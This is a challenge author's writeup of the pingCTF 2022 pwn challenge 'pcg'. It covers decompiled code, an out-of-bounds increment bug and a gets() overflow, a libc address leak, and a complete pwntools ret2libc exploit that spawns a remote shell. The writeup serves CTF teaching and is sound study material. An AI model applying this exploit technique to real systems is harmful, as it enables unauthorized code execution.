---
title: pingCTF 2022 pwn/pcg writeup
date: 2022-12-30 21:03
categories: [CTF, writeups]
tags: [pingCTF2022, pingCTF, pwn, writeup, stack-overflow, ret2libc, my-challenges]
---

On December 17th the [pingCTF2022](https://ctftime.org/event/1769) contest had begun and lasted throughout the weekend. It was organised by a science club based around cybersecurity in the Gdańsk University of Technology. And since I'm one its members I felt like I should probably create some challenges for it too. Sadly I got around to it only a few days before it started so I managed to deliver only one pwn challenge. It was the first challenge I've ever created so bear that in mind if I unknowingly fucked up something trivial... :> If you liked this challenge then look forward to the next year's edition, I'll try to make some more this time.

Also yes, I said I'd make this writeup the next day after the contest had ended buuut college and christmas duties got ahead of me so enjoy it now. Better late than never.

With that in mind, Happy New Year!

## Overview
>The PCG Organization has just released a new demo of their revolutionary format for console images. Surely they've learned how to safely parse them this time... right?

We are presented with a [`.zip` archive](/assets/posts/pwnpcgwrite/challenge.zip) which includes the main executable that is hosted on a remote server - `pcg`, a `libc.so.6` dynamic library which the remote server presumably uses and also the docker container that the remote is hosting. The docker container is given to us only so that we can test our exploit locally against the same infrastructure that the remote is using.

### The program itself
![program's menu](/assets/posts/pwnpcgwrite/pcg1.png)

We can see that the program intends to be a showcase of a novelty image format for console images. After starting it we are immediately presented with a menu with five entries.

The first entry prints out the currently loaded image:
![pcg first menu entry](/assets/posts/pwnpcgwrite/pcgmenu1.png)

The second entry prints out the image's metadata:<br>
![pcg second menu entry](/assets/posts/pwnpcgwrite/pcgmenu2.png)

The third entry allows us to change the current image:
![pcg third menu entry](/assets/posts/pwnpcgwrite/pcgmenu3.png)<br>
It seems that we can enter any random data as the image content, however after that we are no longer able to print the image out, nor show its metadata

The fourth entry doesn't do anything except informing us that "This function has not yet been implemented".

And the fifth entry is self-explanatory.

### Security
Running `checksec` on the binary gives following results:
```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

We can see that the stack canary is not used in this executable so either there are no stack buffers involved, or there is a usable stack overflow somewhere waiting to be discovered.

## Analysis
Let's go the classic route and do some static analysis of the binary.

### Decompilation
I'll use `ghidra` to decompile the binary to see what the program does behind the scenes and try to find some vulnerabilities.
The binary is stripped so there aren't any useful names/symbols visible and we have to make sense of the functions based on the things they do and how they're called instead of their names.
Nonetheless, finding the `main` function is still easy since it's given as the first argument to the `__libc_start_main` function, and names of dynamically linked functions are clearly visible.

#### main
The main function couldn't be less interesting. It only setups an `alarm(120)` so that the program exits after 120 seconds, unbuffers the IO, prints the welcome message and then passes control to a function that handles the menu.

#### handle_menu
```c
void handle_menu(void) {
  long selectedEntry;
  char input [10];
  
  do {
    print_menu();
    input._0_8_ = 0;
    input._8_2_ = 0;
    fgets(input,9,stdin);
    selectedEntry = strtol(input,0,10);
    switch(selectedEntry) {
        default:
          puts("That menu option does not exist! Try again.");
          break;
        case 1:
          show_image(&DAT_001040a0);
          break;
        case 2:
          show_image_metadata(&DAT_001040a0);
          break;
        case 3:
          load_image(&DAT_001040a0);
          break;
        case 4:
          puts("This function has not yet been implemented!");
          break;
        case 5:
          exit(0);
    }
  } while( true );
}
```

This is the main loop of the program, nothing insecure here. We can see that the currently loaded image is stored as a global variable in the .data section. A huge variable in fact, spanning 0xFFFF bytes. First 192 bytes seem to contain the current image, after that it's all zeroes.

#### load_image
It seemed likely that this function would contain an overflow, however not only it writes to the global buffer but also the read is bounded by the size of the buffer so no luck here.

#### show_image_metadata
```c
void show_image_metadata(uint8_t* img) {
  int result = check_image(&DAT_001040a0);
  if (result == 0) {
    print_image_header(&DAT_001040a0);
    print_image_used_colors(&DAT_001040a0);
    putchar(10);
  }
}
```

Here we see that there is a `check_image` function that validates the integrity of the image (also present in the `show_image` function).

#### print_image_header
```c
void print_image_header(uint8_t* img) {
  printf("Loaded image metadata:\n\nwidth: %hhu\nheight: %hhu\ntitleLen: %hhu\ndataLen: %hu\nmagic:  %x\nchecksum: %x\n\n"
         , *(img + 8), *(img + 9), *(img + 10), *(uint16_t*)(img + 11), *(uint32_t*)img, *(uint32_t*)(img + 4));
  puts("PCG HEADER END");
}
```
Based on this function we can figure out the structure of the pcg image header:
```c
struct PCG_HEADER {
    dword magic,
    dword checksum,
    byte width,
    byte height,
    byte titleLength,
    word dataLength
};
```

#### check_image
```c
int check_image(PCG_HEADER* img) {    
    if(img->magic != '\xFFGCP') {
        puts("Not a PCG image!");
        return -1;
    }
    
    uint32_t checksum = '\xFFGCP';
    for(int i = &((PCG_HEADER*)NULL)->width, k = 0; i < sizeof(PCG_HEADER) + img->titleLength + img->dataLength; ++i)
        checksum ^= ((uint8_t*)img)[i] << ((k++ % 4) * 8);
    
    if(checksum != img->checksum) {
        puts("Corrupted PCG image!");
        return -2;
    }

    return 0;
}
```
This function checks the PCG image for integrity. It also hints that the layout of the loaded image in memory is as follows:

| 13 bytes | header.dataLength bytes | header.titleLength bytes |
| PCG_HEADER | data | title |

#### show_image
This monster of a function is responsible for printing out the image and its title. It doesn't write any data anywhere, just iterates over the data section of the image interpreting each byte and putting colors on the screen using the ANSI encoding. Then just prints the title from the title section character by character.

#### print_image_used_colors
The most interesting one for sure as it creates an array on the stack and then increments its elements. The code roughly translates to:
```c
void print_image_used_colors(PCG_HEADER* img) {
  short colors [8] = {};
  
  uint8_t* dataBegin = (uint8_t*)img + sizeof(PCG_HEADER);
  uint8_t* dataPtr = dataBegin;
  while (dataPtr < dataBegin + img.dataLength) {
    uint8_t dataByte = *(dataPtr++);
    if (dataByte >> 6 == 2)
      colors[dataByte & 7] += *(dataPtr++);
    else if (dataByte >> 6 == 3)
      colors[dataByte & 7] += dataByte >> 3 & 7;
    else if (dataByte >> 6 == 0)
      colors[dataByte] += 1;
    else {
      colors[dataByte & 7] += 1;
      colors[dataByte >> 3 & 7] += 1;
    }
  }

  for (int i = 0; i < 8; ++i)
    if (colors[i] != 0)
      printf("Used color: \x1b[%hhum  \x1b[0m %hu times\n", i + 0x28, colors[i]);
}
```
We can see that the function iterates over each byte in the data section and does different things depending on the first two leftmost bits of each byte. The format is designed to encode only 8 distinct colors, thus the colors array has 8 elements.

The encoding is supposed to be interpreted in the following manner:

| bits 7,6 | bits 5,4,3 | bits 2,1,0 | encodes |
|----------|------------|------------|---------|
| 00       | nothing    | color for this pixel | one pixel |
| 01       | color for next pixel | color for this pixel | two pixels |
| 10       | nothing | color for this pixel | 0-255 pixels |
| 11       | number of consecutive pixels with that color | the color | 0-7 pixels |

Moreover when bits 7,6 are `10` the number of consecutive pixels with the color encoded in bits 2,1,0 is given in the immediate next byte.

### The first vulnerability
However, due to an overlook, when bits 7,6 are `00` the colors array is indexed not with a slice of 3 bits (as in all other cases) but with the whole byte instead! Since bits 7,6 have to be `00` this gives us the ability to index and increment whole 64 elements of the colors array, while it has only reserved enough space on the stack for 8 elements.

Mind that the colors array is a word array so each element takes up 2 bytes which means we can increment any byte up to the `64 * 2`th byte after the start of the array. **That definitely includes the return address which we can now control.**

Let's confirm that with gdb:
I'd set up a breakpoint inside the vulnerable function then printed out the entire fragment of the stack that we can control interpreted as addresses.

![gdb stack](/assets/posts/pwnpcgwrite/pcggdb1.png)

`0x555555555892` is the first address here that belongs to the .text section so we can be pretty sure that it's the return address of the function, and indeed when we print out the assembly 5 bytes before the address we can clearly see a juicy `call` instruction followed by the `putchar(10);` call and an epilogue confirming that it is in fact the end of our `show_image_metadata` function.

>The return address is located 56 bytes after the beginning of the colors array which makes its last word the 28th index of the array.
{: .prompt-info }

Now we can jump to basically any part of the program by incrementing (and if needed even overflowing) the last word of the return address. We don't even need to leak the base address of the binary since it's all offset based. If we had a blatant win function somewhere in the code we could just jump to it and the challenge would be over. Let's dig a bit deeper and check the functions we haven't analyzed yet.

### The second vulnerability 
~~Un~~fortunately there isn't a "win" function anywhere in the binary, however there is one very interesting function which isn't called anywhere. I named it `image_change_title`:
```c
void image_change_title(uint8_t* img) {
  char *__dest;
  size_t sVar1;
  char local_18 [16];
  
  gets(local_18);
  __dest = (char *)FUN_001011f7(img);
  strcpy(__dest,local_18);
  sVar1 = strlen(local_18);
  img[10] = (uint8_t)sVar1;
  return;
}
```

We can clearly see the `gets` function used. It reads input from stdin and writes it the the buffer passed in as the parameter. However it's not bounded by any size at all so if we enter more than the reserved 16 characters they just get written to the stack after the array. Add several more characters and now you're overflowing into the return address.

### The leak
It seems like we have to perform a typical [`ret2libc`](https://shellblade.net/files/docs/ret2libc.pdf) since we have the stack overflow available just by using the first vulnerability to jump to the `image_change_title` function. The thing is, PIE is enabled (and more importantly ASLR) so the base address of both the binary and libc is randomized so we can't just overwrite the return address with a static address. We have to leak the libc address first somehow.

While playing with gdb I'd set up a breakpoint on the `ret` instruction in the `print_image_used_colors` function to see the status of the stack and registers just before we return from the function (in other words, just before we jump to the code we want to) to see if there's anything leakable there. My intuition was correct because look at that:

![gdb registers](/assets/posts/pwnpcgwrite/pcggdbregs.png)

There is a pointer to the address of the `_funlockfile` function conveniently sitting in the RDI register (this is a leftover from calling `printf`). And since the binary runs on a x64 linux, the SysV x64 calling convention is used in which the first parameter of any function is passed in the RDI register. Now we can just jump to a `call puts` instruction and that address is gonna get printed out. Next just substract the `_funlockfile`'s offset in the libc library from the printed address and we have the libc base address leaked!

## Exploitation
The plan is simple, use everything we found out so far to get shell on the remote server since the flag is probably stored in a plaintext file there.
I'm going to use the famous [`pwntools`](https://docs.pwntools.com/en/stable/) python library to write the exploit script.

### Where to jump?
Using the first vulnerability I'm going to first jump to a `call puts` instruction to leak the libc address, then using the same vulnerability I'm going to jump to the `image_change_title` function. Then just perform a simple ret2libc using the pwntools' built-in ROP class.

![gdb disasembly](/assets/posts/pwnpcgwrite/pcggdbdisas.png)

The functions were assembled conveniently so the offsets are relatively small and simple ex. we don't have to underflow the return address to jump to previous instructions. Incrementing it is enough.

The address of the first instruction here (at `0x0x0000555555555892`) is the usual value of the return address when we return from the `print_image_used_colors` function. The `call puts` instruction lays `0x7e` bytes later at `0x0000555555555910` and the prologue of the `image_change_title` function `0x86` bytes later at `0x0000555555555918`. That's all the offsets we need.

### Setup and variables
```python
from pwn import *

offset_to_return_addr = 28

offset_from_mov_to_puts = 0x7e
offset_from_mov_to_img_change_title = 0x86

context.binary = bi = ELF('./pcg')
libc = ELF('./libc.so.6')

r = remote('pcg.ctf.knping.pl', 30001)
```

- `offset_to_return_addr` is the index into the colors array that gives us control of the last word of the return address. Its value (28) was discussed [here](#the-first-vulnerability)

The next two offsets were discussed [in the previous section](#where-to-jump)

Then I'm setting the `context.binary` variable to the program's executable so pwntools know the correct architecture, endianness and so on.

On the next line I'm binding the `libc` library to a variable because later I'm gonna use gadgets contained there and also leak the base address.

Finally I'm setting up the remote socket where the program is hosted.

### wrap_in_pcg
If you remember, in order to have the program go to the `print_image_used_colors` function where the first vulnerability is located we have to pass the [`check_image`](#check_image) check first. Here is a python function that takes in bytes we want to use as the image's data and wraps them in a working PCG_HEADER:
```python
def wrap_in_pcg(buf: bytes):
    payload = b'\0\0\0' + packing.p16(len(buf)) + buf # add header parts: { width: 0, height: 0, titleLength: 0, dataLength: len(buf) }
    chksum = 0xff474350
    div = 0
    for b in payload:
        chksum ^= b << ((div % 4) * 8)  
        div += 1
    return b'PCG\xFF' + packing.p32(chksum) + payload # add header parts: { magic: 'PCG\xFF', checksum: chksum } to complete the header
```

### action!
Now we're ready to code the actual exploit part
```python
gotoleakpayload = wrap_in_pcg(packing.p8(offset_to_return_addr) * offset_from_mov_to_puts + b'\x02') #an additional normal pixel needed to print at least one used color to execute printf which allows us the leak, can be anything from \x00 to \x07
gotooverflowpayload = wrap_in_pcg(packing.p8(offset_to_return_addr) * offset_from_mov_to_img_change_title)

r.recvuntil(b">> ") #read program's output until
r.sendline(b'3') #send input to the program
r.sendline(gotoleakpayload)
r.sendline(b'2')
r.recvuntil(b'times\n')
leak = packing.u64(r.recvline().rstrip().ljust(8, b'\0')) - libc.symbols['funlockfile'] #unpack the libc leak into a 64 bit integer and substract the offset to get the base
log.info(f'leaked libc base: {hex(leak)}')

r.recvuntil(b'>> ')
r.sendline(b'3')
r.sendline(gotooverflowpayload)
r.sendline(b'2')

libc.address = leak
rop = ROP(libc)
rop.call("system", [next(libc.search(b'/bin/sh\0'))]) #craft the system("/bin/sh") call using gadgets from libc

r.sendline(b'A' * 24 + rop.chain()) #24 bytes of padding until the return address in image_change_title function, append the ropchain after the padding

r.interactive() #at this point we have the shell access so just return control to the console
```

Let's just run the resulting python script and see if we can get the flag:

![flag](/assets/posts/pwnpcgwrite/pcgflag.png)

Yep, the flag was located at `./home/flag.txt` and by using cat we can just print it out.

And that concludes the challenge.

## Other
One of the teams solved this challenge using the first vulnerability to both leak the libc address from GOT and jump to a onegadget giving them the shell access. You can read their great writeup [here](https://0xariana.github.io/blog/ctf/pingctf/pcg).